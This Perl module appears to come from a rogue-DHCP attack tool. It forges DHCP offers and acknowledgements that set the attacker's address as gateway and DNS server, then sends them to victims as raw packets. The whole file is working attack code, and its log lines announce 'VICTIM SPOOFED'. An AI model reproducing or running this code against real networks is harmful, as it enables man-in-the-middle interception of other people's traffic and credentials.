#Xid, IP To assign, Server IP, DHCP Message, Client MAC
sub ForgeDHCPServer
{
    my $dhcp_packet = Net::DHCP::Packet->new(
        'Op' => 2,
        'Chaddr' => $_[4],
        'Xid' => $_[0],
        'Yiaddr' => $_[1],
        'Giaddr' => $_[2],
        'Hops' => 1);
    $dhcp_packet->addOptionValue(DHO_DHCP_MESSAGE_TYPE(), $_[3]);
    $dhcp_packet->addOptionValue(DHO_DHCP_LEASE_TIME(), "3600");
    $dhcp_packet->addOptionValue(DHO_DHCP_SERVER_IDENTIFIER(), $_[2]);
    $dhcp_packet->addOptionValue(DHO_DOMAIN_NAME_SERVERS(), $_[2]);
    $dhcp_packet->addOptionValue(DHO_SUBNET_MASK(), "255.255.255.0");
    $dhcp_packet->addOptionValue(DHO_ROUTERS(), $_[2]);
    $dhcp_packet->addOptionValue(DHO_DOMAIN_NAME(), "HAXXOR.NET");
    
    if ($_[3] == 5)
    {
        AddLogInfo("/!\\ DHCPACK SENT ! VICTIM SPOOFED [Transaction ID : $_[0] - IP : $_[1]] /!\\\n");
    }
    elsif ($_[3] == 2)
    {
        AddLogInfo("/!\\ PREAUTH OFFER SENT ! /!\\\n");
    }
    SendDHCPResponse($_[1],$dhcp_packet,$_[4]);
}


sub SendDHCPResponse
{
    my $interface = GetSelectedInterface();
    my $packet = Net::RawIP->new({
                          ip => {
                                saddr => get_interface_address($interface),
                                daddr => $_[0],
                                },

                          udp => {
                                source => 67,
                                dest => 68,
                                data => $_[1]->serialize(),
                                },
                          });
    $packet->ethnew($interface);
    print STDERR ("SRC : " .get_interface_mac($interface) ."\n");
    print STDERR ("DST : " .MacFormat($_[2]) ."\n");
    $packet->ethset(source => get_interface_mac($interface),dest => MacFormat($_[2]));    
    $packet->ethsend;
}

return 1;